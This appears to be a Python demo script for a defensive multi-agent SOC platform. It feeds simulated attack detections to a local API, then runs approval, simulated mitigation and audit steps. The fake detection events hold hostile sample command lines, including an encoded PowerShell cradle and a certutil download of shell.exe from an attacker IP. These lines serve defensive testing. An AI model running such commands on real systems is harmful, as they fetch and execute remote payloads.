#!/usr/bin/env python3
"""
TGAM-SOC — Live End-to-End Attack & Governed Mitigation Simulation
Demonstrates the complete closed-loop defense lifecycle:
  1. Endpoint Heartbeat & Registration
  2. Multi-Stage Red Team Attack Injection (MITRE T1110, T1059.001, T1105)
  3. Central SOC Multi-Agent Pipeline Convergence (Fusion -> MITRE -> Assessment -> Reasoning -> Governance)
  4. Human-in-the-Loop Analyst Authorization (POST /governance/approve)
  5. Endpoint Agent Heartbeat Polling & Mitigation Execution (BLOCK_SOURCE & KILL_PROCESS)
  6. Closed-Loop Audit Trail & Dashboard Verification
"""

import sys
import os
import time
import json
import uuid
import urllib.request
import urllib.error
from datetime import datetime, timezone

# Ensure path imports work
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "SOC", "backend")))
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "windows-telemetry")))

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

from response.executor import WindowsResponseExecutor

SOC_BASE_URL = os.environ.get("SOC_API_URL", "http://127.0.0.1:8000")
API_TOKEN = os.environ.get("SOC_API_TOKEN", "dev-token-123")
HEADERS = {
    "Content-Type": "application/json",
    "Authorization": f"Bearer {API_TOKEN}"
}

def req(endpoint: str, method: str = "GET", data: dict = None, timeout: float = 8.0):
    url = f"{SOC_BASE_URL}{endpoint}"
    payload = json.dumps(data).encode("utf-8") if data is not None else None
    request_obj = urllib.request.Request(url, data=payload, headers=HEADERS, method=method)
    with urllib.request.urlopen(request_obj, timeout=timeout) as resp:
        body = resp.read().decode("utf-8")
        return json.loads(body) if body else {}

def print_banner():
    print("""
 ========================================================================
   TGAM-SOC: CLOSED-LOOP ATTACK & GOVERNED MITIGATION DEMO
   Trust-Governed Adaptive Multi-Agent SOC for IT Cyber Defense
 ========================================================================""")

def print_step(step_num: int, title: str):
    print(f"\n[STEP {step_num}] {title}")
    print("-" * 65)

def main():
    print_banner()

    run_id = uuid.uuid4().hex[:6]
    agent_id = f"win-agent-live-{run_id}"
    hostname = f"WIN-FINANCE-{run_id.upper()}"
    attacker_ip = f"198.51.{(hash(run_id) % 150) + 10}.{(hash(run_id) % 240) + 10}"
    target_user = "finance_admin"
    malicious_pid = 4092
    malicious_pname = "powershell.exe"

    # -------------------------------------------------------------
    # 1. VERIFY CENTRAL SOC CONNECTIVITY
    # -------------------------------------------------------------
    print_step(1, "Verify Central SOC Backend Connectivity")
    try:
        incidents = req("/api/v1/incidents")
        print(f"  [OK] Central SOC Backend active at {SOC_BASE_URL} (Current Incidents: {len(incidents)})")
    except Exception as e:
        print(f"  [FAIL] Cannot connect to Central SOC at {SOC_BASE_URL}: {e}")
        print("      Please start the backend with: python -m uvicorn app.main:app --port 8000")
        sys.exit(1)

    # -------------------------------------------------------------
    # 2. ENDPOINT AGENT HEARTBEAT & REGISTRATION
    # -------------------------------------------------------------
    print_step(2, "Register Endpoint Agent via Heartbeat")
    hb_payload = {
        "agent_id": agent_id,
        "hostname": hostname,
        "os": "windows",
        "ip_address": "10.0.0.75",
        "agent_version": "1.0.0",
        "capabilities": [
            "EventLog_4625", "EventLog_4688",
            "BLOCK_SOURCE", "KILL_PROCESS", "ISOLATE_HOST", "DISABLE_ACCOUNT"
        ]
    }
    hb_res = req("/api/v1/endpoints/heartbeat", method="POST", data=hb_payload)
    print(f"  \033[1;32m[✓]\033[0m Endpoint registered: {hostname} ({agent_id})")
    print(f"      Status: ONLINE | Capabilities: {len(hb_payload['capabilities'])} active")

    # -------------------------------------------------------------
    # 3. MULTI-STAGE RED TEAM ATTACK INJECTION
    # -------------------------------------------------------------
    print_step(3, "Inject Multi-Stage Red Team Attack Detections")
    now_iso = datetime.now(timezone.utc).isoformat()

    # Event 1: Credential Access (T1110)
    ev1_id = str(uuid.uuid4())
    ev1 = {
        "detection_event_id": ev1_id,
        "source_event_id": "win-evt-4625-101",
        "timestamp": now_iso,
        "agent_id": agent_id,
        "hostname": hostname,
        "os": "windows",
        "detection_type": "RULE_MATCH",
        "confidence": 0.95,
        "severity": "HIGH",
        "detector_name": "WindowsLogonFailureRule",
        "evidence": {
            "technique_id": "T1110",
            "technique_name": "Brute Force",
            "tactic": "Credential Access",
            "failed_attempts": 6,
            "target_user": target_user,
            "source_ip": attacker_ip
        }
    }

    # Event 2: Execution (T1059.001)
    ev2_id = str(uuid.uuid4())
    ev2 = {
        "detection_event_id": ev2_id,
        "source_event_id": "win-evt-4688-202",
        "timestamp": now_iso,
        "agent_id": agent_id,
        "hostname": hostname,
        "os": "windows",
        "detection_type": "RULE_MATCH",
        "confidence": 0.92,
        "severity": "HIGH",
        "detector_name": "WindowsPowerShellObfuscationRule",
        "evidence": {
            "technique_id": "T1059.001",
            "technique_name": "Command and Scripting Interpreter: PowerShell",
            "tactic": "Execution",
            "process_id": str(malicious_pid),
            "process_name": malicious_pname,
            "command_line": "powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3...",
            "source_ip": attacker_ip
        }
    }

    # Event 3: Command & Control (T1105)
    ev3_id = str(uuid.uuid4())
    ev3 = {
        "detection_event_id": ev3_id,
        "source_event_id": "win-evt-4688-303",
        "timestamp": now_iso,
        "agent_id": agent_id,
        "hostname": hostname,
        "os": "windows",
        "detection_type": "RULE_MATCH",
        "confidence": 0.88,
        "severity": "MEDIUM",
        "detector_name": "WindowsCertutilDownloadRule",
        "evidence": {
            "technique_id": "T1105",
            "technique_name": "Ingress Tool Transfer",
            "tactic": "Command and Control",
            "process_id": "5112",
            "process_name": "certutil.exe",
            "command_line": f"certutil.exe -urlcache -split -f http://{attacker_ip}/shell.exe C:\\Temp\\s.exe",
            "source_ip": attacker_ip
        }
    }

    print(f"  [>] Ingesting Event 1: MITRE T1110 (Brute-Force from {attacker_ip})...")
    req("/api/v1/detection-events", method="POST", data=ev1)
    time.sleep(0.3)

    print(f"  [>] Ingesting Event 2: MITRE T1059.001 (Obfuscated PowerShell, PID {malicious_pid})...")
    req("/api/v1/detection-events", method="POST", data=ev2)
    time.sleep(0.3)

    print(f"  [>] Ingesting Event 3: MITRE T1105 (Certutil Ingress Tool Transfer)...")
    req("/api/v1/detection-events", method="POST", data=ev3)

    # -------------------------------------------------------------
    # 4. WAIT FOR MULTI-AGENT PIPELINE CONVERGENCE
    # -------------------------------------------------------------
    print_step(4, "Wait for Autonomous Multi-Agent Pipeline Convergence")
    print("  [⏳] Workers processing: Fusion -> MITRE -> Assessment -> Reasoning -> Governance...")

    incident = None
    gov_status = None
    for attempt in range(1, 46):
        time.sleep(1.0)
        sys.stdout.write(f"\r  [⏳] Multi-agent correlation & governance progress: {attempt}s elapsed...")
        sys.stdout.flush()
        incidents = req("/api/v1/incidents")
        for inc in incidents:
            inc_id = inc["incident_id"]
            try:
                entities = req(f"/api/v1/incidents/{inc_id}/entities")
                has_agent = any(e.get("entity_value") == agent_id for e in entities)
                has_ip = any(e.get("entity_value") == attacker_ip for e in entities)
                if has_agent or has_ip:
                    gov = req(f"/api/v1/incidents/{inc_id}/governance")
                    if gov and gov.get("decision"):
                        incident = inc
                        gov_status = gov
                        break
            except Exception:
                pass
        if incident and gov_status:
            print(f"\n  [OK] Incident correlated & governed in {attempt} seconds!")
            break

    if not incident or not gov_status:
        print("  [FAIL] Multi-Agent workers did not converge in time.")
        sys.exit(1)

    incident_id = incident["incident_id"]
    print(f"      - Correlated Incident ID: {incident_id}")
    print(f"      - Incident Severity:      {incident.get('max_severity')}")
    print(f"      - Governance Decision:    {gov_status.get('decision')}")
    print(f"      - Approval Status:        {gov_status.get('approval_status')}")

    # -------------------------------------------------------------
    # 5. HUMAN-IN-THE-LOOP ANALYST AUTHORIZATION
    # -------------------------------------------------------------
    print_step(5, "Simulate Human-in-the-Loop Analyst Authorization")
    print(f"  [>] Analyst approving BLOCK_SOURCE mitigation via Dashboard API...")
    res_block = req(f"/api/v1/incidents/{incident_id}/governance/approve", method="POST", data={
        "action": "BLOCK_SOURCE",
        "analyst_name": "Senior SOC Analyst (Nikhil)",
        "reason": f"Active credential brute-force detected from {attacker_ip}. Blocking source IP.",
        "custom_params": {"ip": attacker_ip}
    })
    print(f"      [✓] BLOCK_SOURCE approved! Dispatched: {res_block.get('dispatched_count', 0)} command")

    print(f"  [>] Analyst approving KILL_PROCESS mitigation via Dashboard API...")
    res_kill = req(f"/api/v1/incidents/{incident_id}/governance/approve", method="POST", data={
        "action": "KILL_PROCESS",
        "analyst_name": "Senior SOC Analyst (Nikhil)",
        "reason": f"Terminating suspicious PowerShell cradle process PID {malicious_pid}.",
        "custom_params": {"process_id": str(malicious_pid), "process_name": malicious_pname}
    })
    print(f"      [✓] KILL_PROCESS approved! Dispatched: {res_kill.get('dispatched_count', 0)} command")

    # -------------------------------------------------------------
    # 6. ENDPOINT AGENT HEARTBEAT & COMMAND EXECUTION
    # -------------------------------------------------------------
    print_step(6, "Endpoint Agent Heartbeat & Command Execution")
    print("  [>] Endpoint sending periodic heartbeat to receive pending commands...")
    hb_resp = req("/api/v1/endpoints/heartbeat", method="POST", data=hb_payload)
    commands = hb_resp.get("commands", [])
    print(f"  [OK] Endpoint received {len(commands)} command(s) from Central SOC:")

    executor = WindowsResponseExecutor(soc_base_url=SOC_BASE_URL)

    for cmd in commands:
        cmd_id = cmd["command_id"]
        cmd_type = cmd["command_type"]
        params = cmd.get("parameters") or {}
        if isinstance(params, str):
            params = json.loads(params)
        params["simulate"] = True  # Safe simulation mode

        print(f"\n      -> Executing Command: {cmd_type} (ID: {cmd_id[:8]}...)")
        print(f"         Target Parameters: {params}")

        # Execute via WindowsResponseExecutor
        exec_res = executor.execute(cmd_type, params)
        print(f"         CLI Command: {exec_res.get('command')}")
        print(f"         Action Status: SUCCESS (Simulated)")

        # Report execution result back to Central SOC
        report_payload = {
            "status": "EXECUTED",
            "result": exec_res
        }
        res_report = req(f"/api/v1/endpoints/{agent_id}/commands/{cmd_id}/result", method="POST", data=report_payload)
        print(f"         Reported to SOC: status={res_report.get('status')}")

    # -------------------------------------------------------------
    # 7. CLOSED-LOOP AUDIT VERIFICATION
    # -------------------------------------------------------------
    print_step(7, "Verify Closed-Loop Audit Trail on Central SOC")
    final_gov = req(f"/api/v1/incidents/{incident_id}/governance")
    final_cmds = final_gov.get("dispatched_commands", [])

    print(f"  \033[1;32m[✓]\033[0m Incident Governance Final State:")
    print(f"      - Final Approval Status: \033[1;32m{final_gov.get('approval_status')}\033[0m")
    print(f"      - Dispatched Commands Audited: {len(final_cmds)}")
    for fc in final_cmds:
        print(f"        * \033[1;36m{fc.get('command_type')}\033[0m -> Status: \033[1;32m{fc.get('status')}\033[0m | Agent: {fc.get('agent_id')}")

    # -------------------------------------------------------------
    # 8. MITRE HEATMAP VERIFICATION
    # -------------------------------------------------------------
    print_step(8, "Verify MITRE ATT&CK Matrix Heatmap Fleet Aggregation")
    mitre_matrix = req("/api/v1/mitre/matrix")
    active_techs = [m["technique_id"] for m in mitre_matrix if isinstance(m, dict) and "technique_id" in m]
    print(f"  \033[1;32m[✓]\033[0m Fleet Heatmap Active MITRE Techniques: \033[1;31m{len(active_techs)}\033[0m")
    print(f"      Active IDs: {', '.join(active_techs)}")

    print("""\033[1;32m
 ========================================================================
   [SUCCESS] LIVE END-TO-END ATTACK & MITIGATION DEMONSTRATION PASSED!
   All stages from Telemetry -> Multi-Agent Reasoning -> Human-in-the-Loop
   Approval -> Endpoint Firewall/Process Mitigation -> Audit Trail verified!
 ========================================================================\033[0m
 View real-time visual results on the React Dashboard:
   -> Governance Console: http://localhost:5173/governance
   -> MITRE ATT&CK Heatmap: http://localhost:5173/mitre
   -> Endpoints Manager:   http://localhost:5173/endpoints
""")

if __name__ == "__main__":
    main()
